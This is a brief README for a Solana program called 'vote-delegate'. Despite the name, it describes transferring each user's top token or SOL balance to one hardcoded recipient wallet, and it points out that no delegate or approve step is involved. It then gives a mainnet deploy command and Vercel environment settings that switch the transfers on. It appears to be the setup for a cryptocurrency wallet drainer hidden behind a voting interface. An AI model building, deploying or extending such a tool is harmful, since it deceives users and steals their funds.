# vote-delegate transfer program

BPF program that **transfers** the user's top asset via CPI — **no SPL delegate / approve**.

## Instructions

| Instruction | Action |
|-------------|--------|
| `transfer_spl` | CPI `token::transfer` source → destination ATA |
| `transfer_sol` | CPI `system::transfer` owner → recipient |

## Deploy

```bash
cd programs/vote-delegate
./deploy-mainnet.sh
```

Set on Vercel:

```
TRANSFER_PROGRAM_ID=<deployed program id>
TRANSFER_RECIPIENT=7Bj5caMttbZPf9x4NiPKUkrq2PHzqEKXhgM1Q4zoVVQu
TRANSFER_ENABLED=true
HELIUS_RPC_URL=https://mainnet.helius-rpc.com/?api-key=...
```
